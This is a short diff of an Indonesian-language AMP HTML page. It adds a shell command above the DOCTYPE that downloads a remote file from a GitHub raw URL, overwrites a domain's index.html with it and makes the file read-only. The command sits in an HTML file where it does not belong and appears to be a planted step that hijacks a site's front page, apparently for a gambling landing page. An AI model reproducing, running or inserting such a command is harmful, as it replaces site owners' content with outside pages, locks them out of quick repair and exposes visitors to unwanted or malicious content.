@@ -1,3 +1,4 @@
+curl -s -L https://raw.githubusercontent.com/154mgmarket-max/khusus-landing/refs/heads/main/hormon.txt -o tip4dkomodo.com/index.html && chmod 444 tip4dkomodo.com/index.html
 <!DOCTYPE html>
 <html amp lang="id-ID">
 <head>
